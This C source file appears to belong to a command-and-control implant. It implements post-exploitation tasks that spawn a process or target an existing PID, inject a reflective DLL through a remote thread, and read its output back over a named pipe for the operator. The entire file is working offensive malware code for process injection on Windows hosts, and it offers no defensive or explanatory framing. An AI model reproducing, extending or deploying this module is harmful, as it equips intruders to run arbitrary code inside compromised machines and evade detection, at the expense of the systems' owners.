#include "postex_internal.h"

static VOID PostExInitStartRequest(PostExStartRequest* req)
{
    if (!req) return;
    ZeroMemory(req, sizeof(*req));
    req->backend_kind = POSTEX_BACKEND_REMOTE_THREAD;
    BbInit(&req->dll);
}

static VOID PostExFreeStartRequest(PostExStartRequest* req)
{
    if (!req) return;
    BbFree(&req->dll);
    ZeroMemory(req, sizeof(*req));
}

static BOOL PostExCopyArg(CHAR* dst, SIZE_T dst_size, const CHAR* src,
                          const CHAR* name, CHAR* err, SIZE_T err_size)
{
    SIZE_T len;

    if (!dst || dst_size == 0) {
        return PostExSetError(err, err_size, "invalid postex argument buffer");
    }
    dst[0] = '\0';
    if (!src || !src[0]) {
        return TRUE;
    }

    len = strlen(src);
    if (len >= dst_size) {
        if (err && err_size) {
            _snprintf_s(err, err_size, _TRUNCATE,
                        "postex %s too long (max %Iu bytes)",
                        name ? name : "argument",
                        dst_size - 1);
        }
        return FALSE;
    }
    strcpy_s(dst, dst_size, src);
    return TRUE;
}

static BOOL PostExParseSpawnRequest(struct BeaconContext* ctx, UINT32 task_id,
                                    Parser* parser, PostExStartRequest* req,
                                    CHAR* err, SIZE_T err_size)
{
    CHAR* description = NULL;
    CHAR* args = NULL;
    CHAR* spawn_path = NULL;
    CHAR* spawn_args = NULL;
    BOOL ok = TRUE;

    PostExInitStartRequest(req);
    if (!ctx || !parser || task_id == 0) {
        return PostExSetError(err, err_size, "invalid postex spawn request");
    }

    req->task_id = task_id;
    req->subcmd = POSTEX_SUBCMD_SPAWN_DLL;
    req->owns_process = TRUE;
    req->wait_ms = ParserU32(parser);
    req->max_runtime_ms = ParserU32(parser);
    req->idle_timeout_ms = ParserU32(parser);
    description = ParserString(parser);
    args = ParserString(parser);
    spawn_path = ParserString(parser);
    spawn_args = ParserString(parser);
    req->dll = ParserBytes(parser);

    if (parser->error[0]) {
        PostExSetError(err, err_size, parser->error);
    } else if (!PostExBuildPipeName(ctx, task_id, req->pipe_name, sizeof(req->pipe_name))) {
        PostExSetError(err, err_size, "postex pipe name build failed");
    }

    if (!PostExHasError(err)) {
        ok = PostExCopyArg(req->description, sizeof(req->description), description,
                           "description", err, err_size) &&
             PostExCopyArg(req->module_args, sizeof(req->module_args), args,
                           "module args", err, err_size) &&
             PostExCopyArg(req->spawn_path, sizeof(req->spawn_path), spawn_path,
                           "spawn path", err, err_size) &&
             PostExCopyArg(req->spawn_args, sizeof(req->spawn_args), spawn_args,
                           "spawn args", err, err_size);
    }

    HeapFree(GetProcessHeap(), 0, description);
    HeapFree(GetProcessHeap(), 0, args);
    HeapFree(GetProcessHeap(), 0, spawn_path);
    HeapFree(GetProcessHeap(), 0, spawn_args);
    return ok && !PostExHasError(err);
}

static BOOL PostExParseInjectRequest(struct BeaconContext* ctx, UINT32 task_id,
                                     Parser* parser, PostExStartRequest* req,
                                     CHAR* err, SIZE_T err_size)
{
    CHAR* description = NULL;
    CHAR* args = NULL;
    BOOL ok = TRUE;

    PostExInitStartRequest(req);
    if (!ctx || !parser || task_id == 0) {
        return PostExSetError(err, err_size, "invalid postex inject request");
    }

    req->task_id = task_id;
    req->subcmd = POSTEX_SUBCMD_INJECT_DLL;
    req->wait_ms = ParserU32(parser);
    req->max_runtime_ms = ParserU32(parser);
    req->idle_timeout_ms = ParserU32(parser);
    description = ParserString(parser);
    args = ParserString(parser);
    req->target_pid = ParserU32(parser);
    req->dll = ParserBytes(parser);

    if (parser->error[0]) {
        PostExSetError(err, err_size, parser->error);
    } else if (!PostExBuildPipeName(ctx, task_id, req->pipe_name, sizeof(req->pipe_name))) {
        PostExSetError(err, err_size, "postex pipe name build failed");
    }

    if (!PostExHasError(err)) {
        ok = PostExCopyArg(req->description, sizeof(req->description), description,
                           "description", err, err_size) &&
             PostExCopyArg(req->module_args, sizeof(req->module_args), args,
                           "module args", err, err_size);
    }

    HeapFree(GetProcessHeap(), 0, description);
    HeapFree(GetProcessHeap(), 0, args);
    return ok && !PostExHasError(err);
}

static BOOL PostExValidateStartRequest(const PostExStartRequest* req,
                                       CHAR* err, SIZE_T err_size)
{
    if (!req || req->task_id == 0) {
        return PostExSetError(err, err_size, "invalid postex request");
    }
    if (!req->dll.data || req->dll.len < sizeof(IMAGE_DOS_HEADER)) {
        return PostExSetError(err, err_size, "postex reflective DLL bytes are empty");
    }
    if (req->subcmd == POSTEX_SUBCMD_SPAWN_DLL && !req->spawn_path[0]) {
        return PostExSetError(err, err_size, "postex spawn path is empty");
    }
    if (req->subcmd == POSTEX_SUBCMD_INJECT_DLL && req->target_pid == 0) {
        return PostExSetError(err, err_size, "postex target pid is empty");
    }
    if (req->subcmd != POSTEX_SUBCMD_SPAWN_DLL &&
        req->subcmd != POSTEX_SUBCMD_INJECT_DLL) {
        return PostExSetError(err, err_size, "unknown postex subcommand");
    }
    return TRUE;
}

static ByteBuf PostExPipeConnectFailed(const PostExStartRequest* req,
                                       PostExStartResult* result)
{
    CHAR thread_status[96];
    CHAR config_status[96];
    ByteBuf out;
    DWORD err;

    err = GetLastError();
    PostExFormatRemoteThreadStatus(result ? result->remote_thread : NULL,
                                   thread_status, sizeof(thread_status));
    PostExFormatRemoteConfigStatus(result ? result->process : NULL,
                                   result ? result->remote_config : NULL,
                                   config_status, sizeof(config_status));
    PostExCloseStartedBackend(req, INVALID_HANDLE_VALUE, result);

    BbInit(&out);
    BbPrintf(&out, "postex pipe connect failed: %lu (%s; %s)",
             (unsigned long)err, thread_status, config_status);
    return out;
}

static ByteBuf PostExRunRemoteRequest(struct BeaconContext* ctx,
                                      PostExStartRequest* req)
{
    CHAR errbuf[POSTEX_ERROR_MAX] = { 0 };
    HANDLE pipe = INVALID_HANDLE_VALUE;
    PostExStartResult result;

    PostExStartResultInit(&result);

    if (!PostExValidateStartRequest(req, errbuf, sizeof(errbuf))) {
        return BbFromText(errbuf);
    }

    if (!PostExCanStartJob(ctx, req->task_id, errbuf, sizeof(errbuf))) {
        return BbFromText(errbuf);
    }

    if (!PostExStartRemote(req, &result, errbuf, sizeof(errbuf))) {
        return BbFromText(errbuf[0] ? errbuf : "postex remote start failed");
    }

    if (!PostExConnectPipe(req->pipe_name, &pipe)) {
        return PostExPipeConnectFailed(req, &result);
    }

    PostExWaitData(pipe, req->wait_ms);
    return PostExRegisterStartedJob(ctx, req, pipe, &result);
}

ByteBuf PostExSpawnDll(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    PostExStartRequest req;
    CHAR errbuf[POSTEX_ERROR_MAX] = { 0 };
    ByteBuf out;

    if (!PostExParseSpawnRequest(ctx, task_id, parser, &req, errbuf, sizeof(errbuf))) {
        PostExFreeStartRequest(&req);
        return BbFromText(errbuf);
    }

    out = PostExRunRemoteRequest(ctx, &req);
    PostExFreeStartRequest(&req);
    return out;
}

ByteBuf PostExInjectDll(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    PostExStartRequest req;
    CHAR errbuf[POSTEX_ERROR_MAX] = { 0 };
    ByteBuf out;

    if (!PostExParseInjectRequest(ctx, task_id, parser, &req, errbuf, sizeof(errbuf))) {
        PostExFreeStartRequest(&req);
        return BbFromText(errbuf);
    }

    out = PostExRunRemoteRequest(ctx, &req);
    PostExFreeStartRequest(&req);
    return out;
}
